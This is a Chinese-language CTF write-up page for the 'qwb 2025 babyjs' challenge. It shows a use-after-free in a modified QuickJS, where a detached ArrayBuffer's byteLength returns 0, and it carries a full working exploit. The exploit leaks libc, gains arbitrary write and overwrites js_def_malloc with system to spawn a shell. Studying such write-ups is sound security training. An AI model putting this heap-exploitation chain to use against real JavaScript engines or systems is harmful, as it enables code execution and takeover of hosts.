@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>qwb 2025 babyjs</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./qwb 2025 babyjs.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">qwb 2025 babyjs</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-10-31]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="fen-xi">分析</h2><p>bindiff 发现<code>js_typed_array_get_byteLength</code>之类的函数变了，忽略了detached状态
+调教ai（<a href="https://claude.ai/share/e114a002-2c59-42ca-8376-cb4556b317a2">https://claude.ai/share/e114a002-2c59-42ca-8376-cb4556b317a2</a>）</p>
+<p>筛选得到一个可用的poc</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">let </span><span style="color:#bf616a;">ab </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">ta </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">Uint8Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] Before detach:</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    byteLength =</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">.byteLength); </span><span style="color:#65737e;">// 应该是 256
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#ebcb8b;">Math</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// Detach ArrayBuffer (如果环境支持)
+</span><span style="color:#b48ead;">try </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 某些环境可以通过transferToFixedLength或postMessage detach
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// 这里尝试通过ArrayBuffer.transfer (新API)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(typeof </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.transfer === &#39;</span><span style="color:#a3be8c;">function</span><span style="color:#c0c5ce;">&#39;) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">transfer</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(typeof </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.transferToFixedLength === &#39;</span><span style="color:#a3be8c;">function</span><span style="color:#c0c5ce;">&#39;) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">transferToFixedLength</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">catch</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Detach method not available:</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">.message);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[*] After detach attempt:</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">.byteLength;
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    byteLength =</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">len</span><span style="color:#c0c5ce;">); 
+</span><span style="color:#65737e;">// 漏洞: 应该抛异常但返回了0
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">=== </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[!] VULNERABLE: byteLength is 0 without exception!</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">; </span><span style="color:#65737e;">// 触发UAF
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x42</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">.byteLength);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">        console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">    ta[</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">+ &quot;</span><span style="color:#a3be8c;">] =</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">ta</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">].</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p>调试发现触发了uaf，可读写空闲chunk</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">➜  bin ./qjs backup/tttt.js
+</span><span style="color:#c0c5ce;">[*] Before detach:
+</span><span style="color:#c0c5ce;">    byteLength = 256
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">[*] After detach attempt:
+</span><span style="color:#c0c5ce;">    byteLength = 0
+</span><span style="color:#c0c5ce;">[!] VULNERABLE: byteLength is 0 without exception!
+</span><span style="color:#c0c5ce;">0
+</span><span style="color:#c0c5ce;">    ta[0] = 41
+</span><span style="color:#c0c5ce;">    ta[1] = 42
+</span><span style="color:#c0c5ce;">    ta[2] = 37
+</span><span style="color:#c0c5ce;">    ta[3] = 1d
+</span><span style="color:#c0c5ce;">    ta[4] = 6
+</span><span style="color:#c0c5ce;">    ta[5] = 0
+</span><span style="color:#c0c5ce;">    ta[6] = 0
+</span><span style="color:#c0c5ce;">    ta[7] = 0
+</span><span style="color:#c0c5ce;">    ta[8] = 3
+</span><span style="color:#c0c5ce;">    ta[9] = 89
+</span><span style="color:#c0c5ce;">    ta[10] = 78
+</span><span style="color:#c0c5ce;">    ta[11] = 66
+</span><span style="color:#c0c5ce;">    ta[12] = e5
+</span><span style="color:#c0c5ce;">    ta[13] = f3
+</span><span style="color:#c0c5ce;">    ta[14] = 4c
+</span><span style="color:#c0c5ce;">    ta[15] = 27
+</span><span style="color:#c0c5ce;">    ta[16] = 0
+</span><span style="color:#c0c5ce;">    ta[17] = 0
+</span><span style="color:#c0c5ce;">    ta[18] = 0
+</span><span style="color:#c0c5ce;">    ta[19] = 0
+</span></pre>
+<p>构造0x600堆块uaf直接泄漏libc基址</p>
+<p>构造多个0x40 chunk，通过uaf占位到arraybuffer结构体，修改其中指向操作内存的指针，并重新创建一个typedarray实现任意地址写</p>
+<p>最后索引到堆上存储的<code>JSMallocFunctions</code>结构，修改其中<code>js_def_malloc</code>为system地址，并在其+0x20处布置binsh参数，申请内存时触发调用getshell</p>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(ab){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">// Detach ArrayBuffer (如果环境支持)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">try </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 某些环境可以通过transferToFixedLength或postMessage detach
+</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// 这里尝试通过ArrayBuffer.transfer (新API)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(typeof </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.transfer === &#39;</span><span style="color:#a3be8c;">function</span><span style="color:#c0c5ce;">&#39;) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">transfer</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(typeof </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.transferToFixedLength === &#39;</span><span style="color:#a3be8c;">function</span><span style="color:#c0c5ce;">&#39;) {
+</span><span style="color:#c0c5ce;">            </span><span style="color:#bf616a;">ab</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">transferToFixedLength</span><span style="color:#c0c5ce;">();
+</span><span style="color:#c0c5ce;">        }
+</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">catch</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">a </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">0x10000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">abn </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x600</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">tan </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">abn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">tan</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">ab1 </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x600</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">ta1 </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ab1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ab1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ta1</span><span style="color:#c0c5ce;">.byteLength;
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
+</span><span style="color:#65737e;">// 懒得调偏移了这里必须这么长
+</span><span style="color:#c0c5ce;">        
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">leak_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">ta1</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];
+</span><span style="color:#bf616a;">libc_base </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">leak_addr </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x203b20</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">ablist </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">talist </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">cnt </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">abn </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">tan </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">abn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">ablist</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">abn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">talist</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">tan</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">del</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ablist</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#ebcb8b;">Math</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">ablist2 </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">talist2 </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">abn </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">tan </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">abn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">tan</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] = </span><span style="color:#d08770;">0x4141414141414141</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">+</span><span style="color:#8fa1b3;">BigInt</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">ablist2</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">abn</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">talist2</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">tan</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">cnt</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] talist[</span><span style="color:#c0c5ce;">&quot;+</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">+&quot;</span><span style="color:#a3be8c;">][2]: 0x</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">talist</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">].</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">heap_ptr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">talist</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">control_addr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">talist</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">js_malloc_ptr </span><span style="color:#c0c5ce;">= </span><span style="color:#bf616a;">heap_ptr</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x791e8e0</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0xb0</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">control_addr</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">] = </span><span style="color:#bf616a;">js_malloc_ptr</span><span style="color:#c0c5ce;">;
+</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">control_addr_ct </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">ablist2</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] heap_ptr: 0x</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">heap_ptr</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] js_malloc_ptr: 0x</span><span style="color:#c0c5ce;">&quot; + </span><span style="color:#bf616a;">js_malloc_ptr</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#bf616a;">control_addr_ct</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">]=</span><span style="color:#d08770;">0x0068732f6e69622f</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
+</span><span style="color:#bf616a;">control_addr_ct</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]=</span><span style="color:#bf616a;">libc_base</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">0x58750</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#ebcb8b;">Math</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">min</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">);
+</span></pre>
+<h2 id="reference">reference</h2><p>https://maplebacon.org/2024/05/sdctf-slowjspp/
+https://chovid99.github.io/posts/asis-ctf-finals-2023/#gaining-rce
+https://a1ex.online/2021/09/27/TCTF-final-Promise-JSpwn%E9%A2%98%E8%A7%A3/
+https://xz.aliyun.com/news/6534#toc-0</p>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#reference">reference</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
